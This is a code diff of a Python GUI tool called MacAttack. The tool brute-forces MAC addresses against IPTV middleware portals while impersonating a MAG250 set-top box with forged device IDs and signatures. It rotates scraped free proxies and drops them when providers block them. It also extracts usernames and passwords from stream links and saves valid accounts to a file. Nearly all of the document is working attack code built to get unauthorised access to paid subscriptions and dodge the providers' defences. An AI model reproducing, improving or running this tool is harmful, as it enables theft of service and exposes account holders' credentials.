@@ -1,3 +1,4 @@
+import psutil
 import base64
 import concurrent.futures
 import configparser
@@ -12,9 +13,9 @@ import sys
 import threading
 import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
-#from threading import Lock
 from datetime import datetime
 from urllib.parse import quote, urlparse, urlunparse
+from contextlib import contextmanager
 
 import requests
 import vlc
@@ -31,23 +32,33 @@ from PyQt5.QtWidgets import (QAbstractItemView, QApplication, QCheckBox,
 from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.util.retry import Retry
 
-#logging.basicConfig(level=logging.DEBUG)
+logging.disable(logging.CRITICAL)
 
-def get_token(session, url, mac_address, proxies=None):
+@contextmanager
+def no_proxy_environment():
+    """Context manager that temporarily unsets environment proxy settings."""
+    # Save the original proxy environment variables
+    original_http_proxy = os.environ.get("http_proxy")
+    original_https_proxy = os.environ.get("https_proxy")
+
     try:
-        # Set up retry strategy
-        retry_strategy = Retry(
-            total=5,  # Number of retries
-            backoff_factor=1,  # Time between retries increases exponentially
-            status_forcelist=[500, 502, 503, 504],  # Retry on these HTTP status codes
-            allowed_methods=["GET", "POST"]  # Retry these HTTP methods
-        )
+        # Temporarily remove the environment proxy settings
+        if "http_proxy" in os.environ:
+            del os.environ["http_proxy"]
+        if "https_proxy" in os.environ:
+            del os.environ["https_proxy"]
 
-        # Set up adapter with the retry strategy
-        adapter = HTTPAdapter(max_retries=retry_strategy)
-        session.mount("http://", adapter)
-        session.mount("https://", adapter)
+        yield  # Allow the code inside the block to execute
 
+    finally:
+        # Restore the original proxy environment variables
+        if original_http_proxy is not None:
+            os.environ["http_proxy"] = original_http_proxy
+        if original_https_proxy is not None:
+            os.environ["https_proxy"] = original_https_proxy
+
+def get_token(session, url, mac_address):
+    try:
         serialnumber = hashlib.md5(mac_address.encode()).hexdigest().upper()
         sn = serialnumber[0:13]
         device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
@@ -61,7 +72,6 @@ def get_token(session, url, mac_address, proxies=None):
             'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
             'Accept-Encoding': 'gzip, deflate, zstd',
             'Accept': '*/*',
-            'Connection': 'close',
             'Cache-Control': 'no-cache'
         }
 
@@ -77,15 +87,15 @@ def get_token(session, url, mac_address, proxies=None):
             'timezone': 'America/Los_Angeles'
         }
 
-        # Send GET request to fetch the version.js file with optional proxy
-        response = session.get(f"{url}/c/version.js", headers=headers, cookies=cookies, proxies=proxies)
+        # Send GET request to fetch the version.js file
+        response = session.get(f"{url}/c/version.js", headers=headers, cookies=cookies)
 
         # Extract the version number from the response body
         version = re.search(r"var ver = '(.*)';", response.text)
         
         if version:
             portal_version = version.group(1)
-            logging.debug("Portal Version:", version.group(1))
+            logging.debug("Portal Version: %s", version.group(1))
         else:
             portal_version = "5.0"
             logging.debug("Portal version not found.")
@@ -100,16 +110,16 @@ def get_token(session, url, mac_address, proxies=None):
             'prehash': '0'
         }
 
-        # Step 1: Send the first request to get the token with optional proxy
-        response = session.post(url, headers=headers, cookies=cookies, data=data, proxies=proxies)
+        # Step 1: Send the first request to get the token
+        response = session.post(url, headers=headers, cookies=cookies, data=data)
 
         # Check if the response is successful
         if response.status_code == 200:
             # Parse the JSON response to get the token
             token = response.json().get("js", {}).get("token")
-            logging.debug("Received Token:", token)
+            logging.debug("Received Token: %s", token)
         else:
-            logging.debug(f"Failed to get token, Status Code: {response.status_code}")
+            logging.debug("Failed to get token, Status Code: %d", response.status_code)
             return None
             
         # Step 2: Use the received token to send the second request
@@ -142,19 +152,20 @@ def get_token(session, url, mac_address, proxies=None):
             'prehash': '0'
         }
 
-        # Send the second request with optional proxy
-        response = session.post(url, headers=headers, cookies=cookies, data=data, proxies=proxies)
+        # Send the second request
+        response = session.post(url, headers=headers, cookies=cookies, data=data)
 
         # Output the result of the second request
-        logging.debug("Response Status Code:", response.status_code)
+        logging.debug("Response Status Code: %d", response.status_code)
         logging.debug("Response Text:")
         logging.debug(response.text)   
 
         return token
 
     except Exception as e:
-        logging.error(f"Unexpected error in get_token: {e}")
+        logging.error("Unexpected error in get_token: %s", e)
         return None
+
 
         
 class ProxyFetcher(QThread):
@@ -237,30 +248,31 @@ class ProxyFetcher(QThread):
         """
         proxies = []
         try:
-            response = requests.get(url, timeout=10)
-            if response.status_code == 200:
-                if 'spys.me' in url:
-                    regex = r"[0-9]+(?:\.[0-9]+){3}:[0-9]+"
-                    matches = re.finditer(regex, response.text, re.MULTILINE)
-                    proxies.extend([match.group() for match in matches])
-                elif 'free-proxy-list.net' in url:
-                    html_content = response.text
-                    ip_port_pattern = re.compile(r"<td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>")
-                    matches = ip_port_pattern.findall(html_content)
-                    proxies.extend([f"{ip}:{port}" for ip, port in matches])
-                elif 'sslproxies.org' in url:
-                    html_content = response.text
-                    ip_port_pattern = re.compile(r"<td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>")
-                    matches = ip_port_pattern.findall(html_content)
-                    proxies.extend([f"{ip}:{port}" for ip, port in matches])
-                elif 'freeproxy.world' in url:
-                    html_content = response.text
-                    ip_port_pattern = re.compile(
-                        r'<td class="show-ip-div">\s*(\d+\.\d+\.\d+\.\d+)\s*</td>\s*'
-                        r'<td>\s*<a href=".*?">(\d+)</a>\s*</td>'
-                    )
-                    matches = ip_port_pattern.findall(html_content)
-                    proxies.extend([f"{ip}:{port}" for ip, port in matches])
+            with no_proxy_environment(): #Bypass the enviroment proxy set in the video player tab
+                response = requests.get(url, timeout=10)
+                if response.status_code == 200:
+                    if 'spys.me' in url:
+                        regex = r"[0-9]+(?:\.[0-9]+){3}:[0-9]+"
+                        matches = re.finditer(regex, response.text, re.MULTILINE)
+                        proxies.extend([match.group() for match in matches])
+                    elif 'free-proxy-list.net' in url:
+                        html_content = response.text
+                        ip_port_pattern = re.compile(r"<td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>")
+                        matches = ip_port_pattern.findall(html_content)
+                        proxies.extend([f"{ip}:{port}" for ip, port in matches])
+                    elif 'sslproxies.org' in url:
+                        html_content = response.text
+                        ip_port_pattern = re.compile(r"<td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>")
+                        matches = ip_port_pattern.findall(html_content)
+                        proxies.extend([f"{ip}:{port}" for ip, port in matches])
+                    elif 'freeproxy.world' in url:
+                        html_content = response.text
+                        ip_port_pattern = re.compile(
+                            r'<td class="show-ip-div">\s*(\d+\.\d+\.\d+\.\d+)\s*</td>\s*'
+                            r'<td>\s*<a href=".*?">(\d+)</a>\s*</td>'
+                        )
+                        matches = ip_port_pattern.findall(html_content)
+                        proxies.extend([f"{ip}:{port}" for ip, port in matches])
         except requests.exceptions.RequestException as e:
             logging.debug(f"Error fetching from {url}: {e}")
         return proxies
@@ -275,9 +287,10 @@ class ProxyFetcher(QThread):
             "https": f"http://{proxy}"
         }
         try:
-            response = requests.get(url, proxies=proxies, timeout=10)
-            if response.status_code == 200:
-                return proxy, True
+            with no_proxy_environment(): #Bypass the enviroment proxy set in the video player tab
+                response = requests.get(url, proxies=proxies, timeout=10)
+                if response.status_code == 200:
+                    return proxy, True
         except requests.RequestException as e:
             logging.debug(f"Error testing proxy {proxy}: {str(e)}")
         return proxy, False
@@ -400,7 +413,6 @@ class RequestThread(QThread):
                 'Authorization': f'Bearer {token}',
                 'Accept-Encoding': 'gzip, deflate, zstd',
                 'Accept': '*/*',
-                'Connection': 'close',
                 'Cache-Control': 'no-cache'
             }
 
@@ -458,7 +470,6 @@ class RequestThread(QThread):
                 'Authorization': f'Bearer {token}',
                 'Accept-Encoding': 'gzip, deflate, zstd',
                 'Accept': '*/*',
-                'Connection': 'close',
                 'Cache-Control': 'no-cache'
             }
 
@@ -512,7 +523,6 @@ class RequestThread(QThread):
                 'Authorization': f'Bearer {token}',
                 'Accept-Encoding': 'gzip, deflate, zstd',
                 'Accept': '*/*',
-                'Connection': 'close',
                 'Cache-Control': 'no-cache'
             }
 
@@ -569,7 +579,6 @@ class RequestThread(QThread):
                 'Authorization': f'Bearer {token}',
                 'Accept-Encoding': 'gzip, deflate, zstd',
                 'Accept': '*/*',
-                'Connection': 'close',
                 'Cache-Control': 'no-cache'
             }
 
@@ -1326,7 +1335,6 @@ class MacAttack(QMainWindow):
                     'Authorization': f'Bearer {token}',
                     'Accept-Encoding': 'gzip, deflate, zstd',
                     'Accept': '*/*',
-                    'Connection': 'close',
                     'Cache-Control': 'no-cache'
                 }
 
@@ -1745,11 +1753,11 @@ class MacAttack(QMainWindow):
         proxy_address = self.proxy_input.text()
 
         # remove any app proxy in use
-        if proxy_address:
-            if "http_proxy" in os.environ:
-                del os.environ["http_proxy"]
-            if "https_proxy" in os.environ:
-                del os.environ["https_proxy"]
+        #if proxy_address:
+        #    if "http_proxy" in os.environ:
+        #        del os.environ["http_proxy"]
+        #    if "https_proxy" in os.environ:
+        #        del os.environ["https_proxy"]
 
 
 
@@ -2032,7 +2040,8 @@ class MacAttack(QMainWindow):
             'proxy_remove_errorcount': str(self.proxy_remove_errorcount.value()),
             'ludicrous_speed': str(self.ludicrous_speed_checkbox.isChecked()),  # Save Ludicrous speed state
             'moreoutput': str(self.moreoutput_checkbox.isChecked()),  # Save Enhanced Output Logs state
-            'singleoutputfile': str(self.singleoutputfile_checkbox.isChecked())  # Save Single Output File state
+            'singleoutputfile': str(self.singleoutputfile_checkbox.isChecked()),  # Save Single Output File state
+            'proxy_input': self.proxy_input.text()  # Save proxy input field text
         }
         
         config['Window'] = {
@@ -2084,6 +2093,9 @@ class MacAttack(QMainWindow):
             self.proxy_textbox.setPlainText(config.get('Settings', 'proxy_list', fallback=""))
             self.proxy_concurrent_tests.setValue(config.getint('Settings', 'proxy_concurrent_tests', fallback=100))
             self.proxy_remove_errorcount.setValue(config.getint('Settings', 'proxy_remove_errorcount', fallback=1))
+            
+            # Load proxy input
+            self.proxy_input.setText(config.get('Settings', 'proxy_input', fallback=""))
             
             # Load active tab
             self.tabs.setCurrentIndex(config.getint('Settings', 'active_tab', fallback=0))
@@ -2225,198 +2237,207 @@ class MacAttack(QMainWindow):
                 self.update_mac_label_signal.emit(f"Testing MAC: {mac}, Using PROXY: {selected_proxy}")
 
             try:
-                s = requests.Session()  # Create a session
-                #s.cookies.update({'mac': mac})
-                
-                s.cookies.update({
-                    'adid': hw_version_2,
-                    'debug': '1',
-                    'device_id2': device_id2,
-                    'device_id': device_id2,
-                    'hw_version': '1.7-B',
-                    'mac': mac,
-                    'sn': sn,
-                    'stb_lang': 'en',
-                    'timezone': 'America/Los_Angeles'
-                })
-                
-                s.headers.update({
-                    'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
-                    'Accept-Encoding': 'gzip, deflate, zstd',
-                    'Accept': '*/*',
-                    'Connection': 'close',
-                    'Cache-Control': 'no-cache'
-                })
-                     
-                url = f"{self.base_url}/portal.php?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
+                with no_proxy_environment(): #Bypass the enviroment proxy set in the video player tab
+                    s = requests.Session()  # Create a session
+                    
+                    # Disable the use of environment proxy settings
+                    s.proxies.clear()  # Clears any environment proxies                
+                    
+                    
+                    s.cookies.update({
+                        'adid': hw_version_2,
+                        'debug': '1',
+                        'device_id2': device_id2,
+                        'device_id': device_id2,
+                        'hw_version': '1.7-B',
+                        'mac': mac,
+                        'sn': sn,
+                        'stb_lang': 'en',
+                        'timezone': 'America/Los_Angeles'
+                    })
+                    
+                    s.headers.update({
+                        'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+                        'Accept-Encoding': 'gzip, deflate, zstd',
+                        'Accept': '*/*',
+                        'Cache-Control': 'no-cache'
+                    })
+                         
+                    url = f"{self.base_url}/portal.php?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
 
-                # If proxy is enabled, add the proxy to the session
-                if proxies:
-                    s.proxies.update(proxies)
+                    # If proxy is enabled, add the proxy to the session
+                    if proxies:
+                        s.proxies.update(proxies)
 
-                res = s.get(url, timeout=10, allow_redirects=False)
+                    res = s.get(url, timeout=10, allow_redirects=False)
 
-                if res.text:
-                    data = json.loads(res.text)
-                    token = data.get('js', {}).get('token')  # Safely access token to prevent KeyError
-                    logging.debug(f"TOKEN: {token}")
+                    if res.text:
+                        data = json.loads(res.text)
+                        token = data.get('js', {}).get('token')  # Safely access token to prevent KeyError
+                        logging.debug(f"TOKEN: {token}")
 
-                    if token:
-                        base_token = token
-                        token = get_token(s, url, mac, proxies) #activates token for some providers
-                        logging.debug(f"Clean TOKEN: {token}")
-                        if not token:
-                            token = base_token
-                    url2 = f"{self.base_url}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
-                    headers = {
-                        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
-                        'Authorization': f'Bearer {token}',
-                        "X-User-Agent": "Model: MAG250; Link: WiFi",
-                    }
+                        if token:
+                            base_token = token
+                            token = self.get_token(s, url, mac, proxies) #activates token for some providers
+                            logging.debug(f"Clean TOKEN: {token}")
+                            if not token:
+                                token = base_token
+                        url2 = f"{self.base_url}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
+                        headers = {
+                            "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
+                            'Authorization': f'Bearer {token}',
+                            "X-User-Agent": "Model: MAG250; Link: WiFi",
+                        }
 
-                    res2 = s.get(url2, headers=headers, timeout=10, allow_redirects=False)
+                        res2 = s.get(url2, headers=headers, timeout=10, allow_redirects=False)
 
-                    if res2.text:
-                        data = json.loads(res2.text)
-                        if 'js' in data and 'mac' in data['js'] and 'phone' in data['js']:
-                            mac = data['js']['mac']
-                            expiry = data['js']['phone']
+                        if res2.text:
+                            data = json.loads(res2.text)
+                            if 'js' in data and 'mac' in data['js'] and 'phone' in data['js']:
+                                mac = data['js']['mac']
+                                expiry = data['js']['phone']
 
-                            url3 = f"{self.base_url}/portal.php?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
-                            res3 = s.get(url3, headers=headers, timeout=10, allow_redirects=False)
+                                url3 = f"{self.base_url}/portal.php?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
+                                res3 = s.get(url3, headers=headers, timeout=10, allow_redirects=False)
 
-                            count = 0
-                            if res3.status_code == 200:
-                                url4 = f"{self.base_url}/portal.php?type=itv&action=create_link&cmd=http://localhost/ch/1_&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml"
-                                res4 = s.get(url4, headers=headers, timeout=10, allow_redirects=False)
-                                data4 = json.loads(res4.text)
+                                count = 0
+                                if res3.status_code == 200:
+                                    url4 = f"{self.base_url}/portal.php?type=itv&action=create_link&cmd=http://localhost/ch/1_&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml"
+                                    res4 = s.get(url4, headers=headers, timeout=10, allow_redirects=False)
+                                    data4 = json.loads(res4.text)
 
-                                cmd_value4 = data4["js"]["cmd"].replace("ffmpeg ", "", 1)
-                                cmd_value4 = cmd_value4.replace("'ffmpeg' ", "")
-                                
-                                logging.debug(cmd_value4)
+                                    cmd_value4 = data4["js"]["cmd"].replace("ffmpeg ", "", 1)
+                                    cmd_value4 = cmd_value4.replace("'ffmpeg' ", "")
+                                    
+                                    logging.debug(cmd_value4)
 
-                                parsed_url = urlparse(cmd_value4)
-                                hostname = parsed_url.hostname
-                                
-                                
-                                domain_and_port = f"{parsed_url.scheme}://{parsed_url.hostname}:{parsed_url.port}" if parsed_url.port else f"{parsed_url.scheme}://{parsed_url.hostname}"
+                                    parsed_url = urlparse(cmd_value4)
+                                    hostname = parsed_url.hostname
+                                    
+                                    
+                                    domain_and_port = f"{parsed_url.scheme}://{parsed_url.hostname}:{parsed_url.port}" if parsed_url.port else f"{parsed_url.scheme}://{parsed_url.hostname}"
 
-                                logging.debug(f"Real Host: {domain_and_port}")
+                                    logging.debug(f"Real Host: {domain_and_port}")
 
-                                path_parts = parsed_url.path.strip("/").split("/")
-                                userfound = 0
-                                if len(path_parts) >= 3:
-                                    username = path_parts[0]
-                                    password = path_parts[1]
-                                    logging.debug(f"Username: {username}")
-                                    logging.debug(f"Password: {password}")
-                                    #userfound = 0 #disable it by changing it to 0
-                                    userfound = 1
-                                else:
-                                    logging.debug("Less than 2 subdirectories found in the path.")
+                                    path_parts = parsed_url.path.strip("/").split("/")
                                     userfound = 0
-
-                                try:
-                                    response_data = json.loads(res3.text)
-                                    if isinstance(response_data, dict) and "js" in response_data and "data" in response_data["js"]:
-                                        channels_data = response_data["js"]["data"]
-                                        count = len(channels_data)
+                                    if len(path_parts) >= 3:
+                                        username = path_parts[0]
+                                        password = path_parts[1]
+                                        logging.debug(f"Username: {username}")
+                                        logging.debug(f"Password: {password}")
+                                        #userfound = 0 #disable it by changing it to 0
+                                        userfound = 1
                                     else:
-                                        self.update_error_text_signal.emit("Unexpected data structure for channels.")
+                                        logging.debug("Less than 2 subdirectories found in the path.")
+                                        userfound = 0
+
+                                    try:
+                                        response_data = json.loads(res3.text)
+                                        if isinstance(response_data, dict) and "js" in response_data and "data" in response_data["js"]:
+                                            channels_data = response_data["js"]["data"]
+                                            count = len(channels_data)
+                                        else:
+                                            self.update_error_text_signal.emit("Unexpected data structure for channels.")
+                                            count = 0
+                                    except (TypeError, json.decoder.JSONDecodeError) as e:
+                                        self.update_error_text_signal.emit(f"Data parsing error for channels data: {str(e)}")
                                         count = 0
-                                except (TypeError, json.decoder.JSONDecodeError) as e:
-                                    self.update_error_text_signal.emit(f"Data parsing error for channels data: {str(e)}")
-                                    count = 0
 
-                            if count > 0:
-                                logging.info("Mac found")
-                                if self.autoloadmac_checkbox.isChecked():
-                                    self.hostname_input.setText(self.base_url)
-                                    self.mac_input.setText(mac)
+                                if count > 0:
+                                    logging.info("Mac found")
+                                    if self.autoloadmac_checkbox.isChecked():
+                                        self.hostname_input.setText(self.base_url)
+                                        self.mac_input.setText(mac)
 
-                                if self.output_file is None:
-                                    output_filename = self.OutputMastermind()
-                                    self.output_file = open(output_filename, "a")
+                                    if self.output_file is None:
+                                        output_filename = self.OutputMastermind()
+                                        self.output_file = open(output_filename, "a")
 
-                                if self.moreoutput_checkbox.isChecked():
-                                    # Helper function to resolve IP addresses
-                                    def resolve_ip_address(hostname, default_message):
-                                        try:
-                                            return socket.gethostbyname(hostname)
-                                        except socket.gaierror:
-                                            logging.info(f"Unable to resolve the IP address for {hostname}.")
-                                            return default_message
+                                    if self.moreoutput_checkbox.isChecked():
+                                        # Helper function to resolve IP addresses
+                                        def resolve_ip_address(hostname, default_message):
+                                            try:
+                                                return socket.gethostbyname(hostname)
+                                            except socket.gaierror:
+                                                logging.info(f"Unable to resolve the IP address for {hostname}.")
+                                                return default_message
 
-                                    # Resolve middleware IP address
-                                    parsed_middleware = urlparse(self.base_url)
-                                    middleware_hostname = parsed_middleware.hostname
-                                    middleware_ip_address = resolve_ip_address(middleware_hostname, "No Portal?")
-                                    logging.info(f"The IP address for {middleware_hostname} is {middleware_ip_address}")
+                                        # Resolve middleware IP address
+                                        parsed_middleware = urlparse(self.base_url)
+                                        middleware_hostname = parsed_middleware.hostname
+                                        middleware_ip_address = resolve_ip_address(middleware_hostname, "No Portal?")
+                                        logging.info(f"The IP address for {middleware_hostname} is {middleware_ip_address}")
 
-                                    # Resolve backend IP address
-                                    backend_ip_address = resolve_ip_address(hostname, "No Backend")
-                                    logging.info(f"The IP address for {hostname} is {backend_ip_address}")
+                                        # Resolve backend IP address
+                                        backend_ip_address = resolve_ip_address(hostname, "No Backend")
+                                        logging.info(f"The IP address for {hostname} is {backend_ip_address}")
 
-                                    # Determine if middleware and backend are the same
-                                    is_same_host = middleware_hostname == hostname
-                                    host_comparison = "Same middleware and backend" if is_same_host else "Different middleware and backend"
-                                    logging.info(host_comparison)
+                                        # Determine if middleware and backend are the same
+                                        is_same_host = middleware_hostname == hostname
+                                        host_comparison = "Same middleware and backend" if is_same_host else "Different middleware and backend"
+                                        logging.info(host_comparison)
 
-                                    # Construct the result message
-                                    def generate_result_message(include_user, include_backend):
-                                        base_message = (
+                                        # Construct the result message
+                                        def generate_result_message(include_user, include_backend):
+                                            # Get the current date and time in the desired format
+                                            current_time = datetime.now().strftime("%B %d, %Y %H:%M")
+
+                                            base_message = (
+                                                f"{'Portal:':<10} {self.iptv_link}\n"
+                                                f"{'Portal IP:':<10} {middleware_ip_address}\n"
+                                                f"{'MAC:':<10} {mac}\n"
+                                                f"{'Discovered:':<10} {current_time}\n"  # Added discovered line
+                                                f"{'Expiry:':<10} {expiry}\n"
+                                                f"{'Channels:':<10} {count}\n"
+                                            )
+                                            
+                                            backend_message = (
+                                                f"{'Backend:':<10} {domain_and_port}\n"
+                                                f"{'Backend IP:':<10} {backend_ip_address}\n"
+                                            ) if include_backend else ""
+                                            
+                                            user_message = (
+                                                f"{'Username:':<10} {username}\n"
+                                                f"{'Password:':<10} {password}\n"
+                                            ) if include_user else ""
+                                            
+                                            return base_message + backend_message + user_message
+
+                                        # Emit the appropriate message based on backend and username status
+                                        result_message = generate_result_message(userfound, not is_same_host)
+                                        self.update_output_text_signal.emit(result_message)  # No extra newline here
+
+                                    else:
+                                        # Simple output message when additional details are not required
+                                        result_message = (
                                             f"{'Portal:':<10} {self.iptv_link}\n"
-                                            f"{'Portal IP:':<10} {middleware_ip_address}\n"
                                             f"{'MAC:':<10} {mac}\n"
                                             f"{'Expiry:':<10} {expiry}\n"
                                             f"{'Channels:':<10} {count}\n"
                                         )
-                                        backend_message = (
-                                            f"{'Backend:':<10} {domain_and_port}\n"
-                                            f"{'Backend IP:':<10} {backend_ip_address}\n"
-                                        ) if include_backend else ""
-                                        
-                                        user_message = (
-                                            f"{'Username:':<10} {username}\n"
-                                            f"{'Password:':<10} {password}\n"
-                                        ) if include_user else ""
-                                        
-                                        return base_message + backend_message + user_message
+                                        self.update_output_text_signal.emit(result_message)  # No extra newline here
 
-                                    # Emit the appropriate message based on backend and username status
-                                    result_message = generate_result_message(userfound, not is_same_host)
-                                    self.update_output_text_signal.emit(result_message)  # No extra newline here
+                                    # Write to file with a single blank line after each output
+                                    self.output_file.write(result_message + '\n')
+                                    self.output_file.flush()  # Ensures data is written immediately
+                                    if self.successsound_checkbox.isChecked():
+                                        sound_thread = threading.Thread(target=self.play_success_sound)
+                                        sound_thread.start()  # Start the background thread
 
+                                    if self.autostop_checkbox.isChecked():
+                                        logging.debug("autostop_checkbox is checked, stopping...")
+                                        self.stop_button.click()
                                 else:
-                                    # Simple output message when additional details are not required
-                                    result_message = (
-                                        f"{'Portal:':<10} {self.iptv_link}\n"
-                                        f"{'MAC:':<10} {mac}\n"
-                                        f"{'Expiry:':<10} {expiry}\n"
-                                        f"{'Channels:':<10} {count}\n"
-                                    )
-                                    self.update_output_text_signal.emit(result_message)  # No extra newline here
-
-                                # Write to file with a single blank line after each output
-                                self.output_file.write(result_message + '\n')
-                                self.output_file.flush()  # Ensures data is written immediately
-                                if self.successsound_checkbox.isChecked():
-                                    sound_thread = threading.Thread(target=self.play_success_sound)
-                                    sound_thread.start()  # Start the background thread
-
-                                if self.autostop_checkbox.isChecked():
-                                    logging.debug("autostop_checkbox is checked, stopping...")
-                                    self.stop_button.click()
+                                    result_message = f"MAC: {mac} connects, but has 0 channels. Bummer."
+                                    self.update_error_text_signal.emit(result_message)
                             else:
-                                result_message = f"MAC: {mac} connects, but has 0 channels. Bummer."
-                                self.update_error_text_signal.emit(result_message)
-                        else:
-                            #self.update_error_text_signal.emit(f"No JSON response for MAC {mac}")
-                            logging.debug(f"No JSON response for MAC {mac}")
+                                #self.update_error_text_signal.emit(f"No JSON response for MAC {mac}")
+                                logging.debug(f"No JSON response for MAC {mac}")
    
             #Try failed because data was non json    
             except (json.decoder.JSONDecodeError, requests.exceptions.RequestException, TypeError) as e:
+                logging.debug("Non JSON")
                 if "Expecting value" in str(e):
                     #logging.debug(f"Raw Response Content:\n{mac}\n%s", res.text)
                     
@@ -2450,6 +2471,7 @@ class MacAttack(QMainWindow):
                     elif (
                         "Could not connect" in res.text
                         or "Network is unreachable" in res.text
+                        or "Non-compliance" in res.text
                     ):
                         # Track error count for the proxy
                         if selected_proxy not in self.proxy_error_counts:
@@ -2474,7 +2496,15 @@ class MacAttack(QMainWindow):
                             self.proxy_error_counts[selected_proxy] += 1                       
                         self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Access Denied</b> blocked access")
                         self.remove_proxy(selected_proxy, self.proxy_error_counts) # remove the proxy if it exceeds the allowed error count
-                    elif "502 Proxy Error " in res.text:
+                    elif "Error code 520" in res.text:
+                        # Track error count for the proxy
+                        if selected_proxy not in self.proxy_error_counts:
+                            self.proxy_error_counts[selected_proxy] = 1
+                        else:
+                            self.proxy_error_counts[selected_proxy] += 1                       
+                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Error code 520</b> >Unknown error")
+                        self.remove_proxy(selected_proxy, self.proxy_error_counts) # remove the proxy if it exceeds the allowed error count
+                    elif "502 Proxy Error" in res.text:
                         # Track error count for the proxy
                         if selected_proxy not in self.proxy_error_counts:
                             self.proxy_error_counts[selected_proxy] = 1
@@ -2638,7 +2668,114 @@ class MacAttack(QMainWindow):
                         #logging.debug(f"{str(e)}")
                         logging.debug(f"Raw Response Content:\n{mac}\n%s", res.text)
                     #self.error_count += 1
-        
+    def get_token(self, session, url, mac_address, proxies=None):
+        try:
+            serialnumber = hashlib.md5(mac_address.encode()).hexdigest().upper()
+            sn = serialnumber[0:13]
+            device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
+            device_id2 = hashlib.sha256(mac_address.encode()).hexdigest().upper()
+            hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
+            signature_string = f'{sn}{mac_address}'
+            signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
+            metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': '0'}
+
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+                'Accept-Encoding': 'gzip, deflate, zstd',
+                'Accept': '*/*',
+                'Cache-Control': 'no-cache'
+            }
+
+            cookies = {
+                'adid': hw_version_2,
+                'debug': '1',
+                'device_id2': device_id2,
+                'device_id': device_id2,
+                'hw_version': '1.7-B',
+                'mac': mac_address,
+                'sn': sn,
+                'stb_lang': 'en',
+                'timezone': 'America/Los_Angeles'
+            }
+
+            # Send GET request to fetch the version.js file with optional proxy
+            response = session.get(f"{url}/c/version.js", headers=headers, cookies=cookies, proxies=proxies)
+
+            # Extract the version number from the response body
+            version = re.search(r"var ver = '(.*)';", response.text)
+            
+            if version:
+                portal_version = version.group(1)
+                logging.debug("Portal Version: %s", version.group(1))
+            else:
+                portal_version = "5.0"
+                logging.debug("Portal version not found.")
+
+            url = f"{url}/portal.php"  # Add portal.php for next 2 requests
+
+            # Data for the first request (to get the token)
+            data = {
+                'type': 'stb',
+                'action': 'handshake',
+                'token': '',
+                'prehash': '0'
+            }
+
+            # Step 1: Send the first request to get the token with optional proxy
+            response = session.post(url, headers=headers, cookies=cookies, data=data, proxies=proxies)
+
+            # Check if the response is successful
+            if response.status_code == 200:
+                # Parse the JSON response to get the token
+                token = response.json().get("js", {}).get("token")
+                logging.debug("Received Token: %s", token)
+            else:
+                logging.debug(f"Failed to get token, Status Code: {response.status_code}")
+                return None
+                
+            # Step 2: Use the received token to send the second request
+
+            # Update headers for the second request with the Authorization Bearer token
+            headers['Authorization'] = f'Bearer {token}'
+
+            # Data for the second request (get profile)
+            data = {
+                'type': 'stb',
+                'action': 'get_profile',
+                'hd': '1',
+                'ver': f'ImageDescription: 0.2.18-r23-250; ImageDate: Wed Aug 29 10:49:53 EEST 2018; PORTAL version: {portal_version}; API Version: JS API version: 343; STB API version: 146; Player Engine version: 0x58c',
+                'num_banks': '2',
+                'sn': sn,
+                'stb_type': 'MAG250',
+                'client_type': 'STB',
+                'image_version': '218',
+                'video_out': 'hdmi',
+                'device_id': device_id2,
+                'device_id2': device_id2,
+                'signature': signature,
+                'auth_second_step': '1',
+                'hw_version': '1.7-BD-00',
+                'not_valid_token': '0',
+                'metrics': metrics,
+                'hw_version_2': hw_version_2,
+                'timestamp': round(time.time()),
+                'api_signature': '262',
+                'prehash': '0'
+            }
+
+            # Send the second request with optional proxy
+            response = session.post(url, headers=headers, cookies=cookies, data=data, proxies=proxies)
+
+            # Output the result of the second request
+            logging.debug(f"Response Status Code: {response.status_code}")
+            logging.debug("Response Text:")
+            logging.debug(response.text)   
+
+            return token
+
+        except Exception as e:
+            logging.error(f"Unexpected error in get_token: {e}")
+            return None        
     def remove_proxy(self, proxy, proxy_error_counts):
         """Remove a proxy after exceeding error count and update UI."""
         error_limit = self.proxy_remove_errorcount.value()
@@ -2728,6 +2865,7 @@ class MacAttack(QMainWindow):
             return filename
     
     def GiveUp(self):
